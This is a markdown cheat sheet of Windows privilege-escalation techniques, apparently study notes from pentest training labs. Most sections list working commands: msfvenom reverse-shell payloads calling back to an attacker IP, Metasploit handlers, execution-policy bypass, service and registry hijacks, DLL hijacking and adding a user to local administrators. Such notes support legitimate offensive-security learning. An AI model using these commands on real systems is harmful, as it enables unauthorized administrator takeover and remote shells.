# Windows Privesc

## Enumeration

- You can do some manual enumeration using [Windows CMD](powershell-cmd.md#cmd)
- You can also do automatic enumeration using dedicated [tools (see the tools below)](#tools)

## Kernel Exploits

### What is a kernel

![Kernel](https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Kernel_Layout.svg/1024px-Kernel_Layout.svg.png)  
- [See the definition on Wikipedia](https://en.wikipedia.org/wiki/Kernel_(operating_system))

#### Windows kernel

![Windows kernel](https://www.thewindowsclub.com/wp-content/uploads/2019/08/Windows-Kernel.png)  
- [Windows kernel in detail here](https://www.thewindowsclub.com/what-is-a-kernel-in-os-what-are-the-types-of-kernel)

### Kernel Exploits

- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
- See an example of a privesc with a kernel exploit in [this writeup](../writeups/HTB-Devel.md)

#### Methodology

1. Enumerate win version / patch level (systeminfo)
2. Find matching exploits (Google, ExploitDB, GIthub)
3. Compile and run

**ATTENTION: Kernel exploits are often unstable and could crash the system**

### Tools

#### Executables

- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [Watson](https://github.com/rasta-mouse/Watson)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [SharpUp](https://github.com/GhostPack/SharpUp)

#### PowerShell

- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [JAWS](https://github.com/411Hall/JAWS)

#### Other

- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
- [Precompiled kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Unquoted Service Path Vulnerabilities

### What is it

Abuse of the research methodology of executable of windows. We will try to place an excutable in a location windows will be looking.

### Preresquisites

- We will need write permissions in an executable folder
- Check if the binary path is unquoted, we can check a service using `sc qc name-of-service`
- Check if we have writing rights with our user we can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` we will have a list of user groups with read and write privs
- Use msfvenom to generate an executable file `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK-MACHINE-IP LPORT=7777 -f exe > executable_name.exe`
- Restart the service `sc start service-name `

### Methodology

- Enumerate with automatic tools or this command: `wmic service get name,displayname,pathname,startmode` (it will list the running services)
- Check if we can write in the folder of the service 

### Enumeration with powerUp

- `powershell -ep bypass`
- `. .\PowerUp.ps1`
- `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162632057-e45dc167-b88a-4e4d-a989-563eb810cda2.png)  

### Exploitation

- `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
- We place the executable in the folder of the program we wish to abuse
- We start the vulnerable service in our example unquotedsvc `sc start unquotedsvc`
- we should be added as an administrator we can verify this using `net localgroup administrators`

## Runas

### What is it

- It is the possibility of running a command as another user

### Enumerate

- `cmdkey /list`

### How to exploit

- Check the writeup for Access on HTB [here](../writeups/HTB-access.md) to have an example of privesc using runas

## Autorun

### What is it

- It is when you abuse the fact that a program runs automatically

### Enumerate

- Check what programs have autorun using [Windows internals - autorun](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) see example below  
![image](https://user-images.githubusercontent.com/96747355/162574595-2e7704db-5be0-411c-98f0-1b075628ec92.png)  

- Check that the program you found that allows FILE_ALL_ACCESS to Everyone using [Windows internals - accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) in our example we would type this in the cmd `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`  
![image](https://user-images.githubusercontent.com/96747355/162574634-d6459714-366e-4afa-9735-d469eb8e3ab9.png)  

**OR**  

- With [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
  - In a win cmd type `powershell -ep bypass`
  - Then `. .\PowerUp.ps1` to load powerUp
  - `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162574989-40f208c1-12ac-47d6-99b7-3035cf9b4297.png)  

### How to exploit

- In kali
  - `msfconsole`
  - `use multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set lhost Your-Kali-IP-Address`
  - `run`
  - In another cmd tab `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe` (give it the same name as the program that has autorun)
- Take the program you created with msfvenom in your target (python HTTP server and then the browser in your target)
- In your target
  - Place the program in the directory where the autorun program is
  - Wait for the administrator to log in
- You should have a shell in your kali in Metasploit

## Service Escalation - Registry

### What is it

- If we have admin rights of a registry key in service we could use this to make an executable run with a service (add a user, get a shell, ...)

### Enumeration

- In a powershell prompt type `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`  
![image](https://user-images.githubusercontent.com/96747355/162577548-662dd3db-2722-40c8-ae19-3ae386d32a90.png)  

### How to exploit

- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
- In a cmd from our target `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
- Now we just need to start the service `sc start regsvc`
- `net localgroup administrators` we can see that our user is now in the administrators group

## Escalation via Executable Files

### What is it

- Abusing an executable that we have permissions on

### Enumeration

- `powershell -ep bypass`
- `. .\PowerUp.ps1`
- `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162591193-6d2cec98-1e15-492e-b129-001c59b1ae84.png)  

**OR**

- If we know what program it is we can just do `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"` where File Permissions Service is the program we want to abuse  
![image](https://user-images.githubusercontent.com/96747355/162591258-02f01743-1c36-400c-9c13-539c42db8a79.png)  

### How to exploit

- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
- In the target cmd `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
- `sc start filepermsvc`
- Our user should be in the local administrators group

## Startup Applications

### What is it

- We will abuse a program that is launched on startup in which we have rights

### Enumeration

- We can enumerate using [Windows internals - icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`  
![image](https://user-images.githubusercontent.com/96747355/162592396-a2979aa4-f502-4455-b2ca-2b7997b1763c.png)  
- The `BUILTIN/Users` group has full acces `(F)` to the Startup directory

### How to exploit

- In our attack machine `msfconsole` we launch Metasploit
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set lhost IP-OF-OUR-ATTACK-MACHINE`
- `run`
- In another tab `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP-OF-OUR-ATTACK-MACHINE -f exe -o x.exe`
- We serve the executable in our target (python http server -> and browse to it from our target)
- We put the file in  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (If you are in the explorer you may have to type ProgramData in the path if it does not appear).
- We wait for an admin to log in
- We should have a shell in metasploit  
![image](https://user-images.githubusercontent.com/96747355/162592807-7867e7e1-62f9-4cca-89b9-78ed895ee09c.png)  

## DLL Hijacking

### What is it

- DLL is a dynamic Library they often run with executables, when an executable runs the system will look for the dll and if the dll does not exist we could replace it with one of our own.

### Enumeration

- We can find it using procmon, we need to add 2 filters "Result is NAME NOT FOUND" and "PATH ends with .dll"  
![image](https://user-images.githubusercontent.com/96747355/162593986-a50865dc-11eb-44ef-8793-60bbdd2adaa1.png)  
  - This will list the dll not found
  - We will need write access to the folder where the dll are missing

### How to exploit

- We are going to use [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c)
- Edit the file and modify the system command to add our user to the admin goup which would look like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We can now compile it `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
- We serve it to our target (python http server -> browser of our target)
- We put it in the path where the system will look for it, in our example it is the temp folder
- We restart the service `sc stop dllsvc & sc start dllsvc`
- Our user should be in the admin group now

## Binary path

### Enumeration

- PowerUP we should see the service exploitable under the `[*] Checking service permissions`  

**OR**

- We can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `accesschk64.exe -wuvc Everyone *`
  - Will list service we can write and to which everyone has access (in our example the service is daclsvc)
![image](https://user-images.githubusercontent.com/96747355/162620616-800737e9-9762-4a0e-b06d-41ea822abd32.png)  

### Exploitation

- `sc config daclsvc binpath= "net localgroup administrators user /add"`
- `sc start daclsvc`
- We should be added to the administrators group `net localgroup administrators`

## Resources

{% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
{% embed url="https://tryhackme.com/room/windowsprivescarena" %} Windows privesc arena by TCM on TryHackMe {% endembed %}
{% embed url="https://www.fuzzysecurity.com/tutorials/16.html" %} Windows privesc on Fuzzy Security{% endembed %}  
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %} Windows privesc on PayloadsAllTheThings{% endembed %}  
{% embed url="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" %} Windows privesc on Absolomb{% endembed %}  
{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %} Windows privesc Sushant 747{% endembed %}  
{% embed url="https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources" %} Windows-Privilege-Escalation-Resources - TCM Course Resources - Gr1mmie {% endembed %}  
{% embed url="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation" %} Windows PrivEsc Checklist - Hacktricks {% endembed %}  
{% embed url="https://github.com/gtworek/Priv2Admin" %} Priv2Admin {% endembed %}  
